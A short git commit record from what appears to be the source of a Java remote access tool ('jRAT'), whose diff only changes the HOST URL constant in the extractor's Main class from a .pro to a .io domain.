cbc154797f0c4220d62c93a508155c32a2ee6e8d
redpois0n <git@redpois0n>
2014-02-19 12:19:18 +0100

    Host changed

--- src/pro/jrat/extractor/Main.java
+++ src/pro/jrat/extractor/Main.java
@@ -4,7 +4,7 @@ import javax.swing.UIManager;
 
 public class Main {
 	
-	public static final String HOST = "https://jrat.pro/";
+	public static final String HOST = "http://jrat.io/";
 	
 	public static void main(String[] args) throws Exception {
 		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
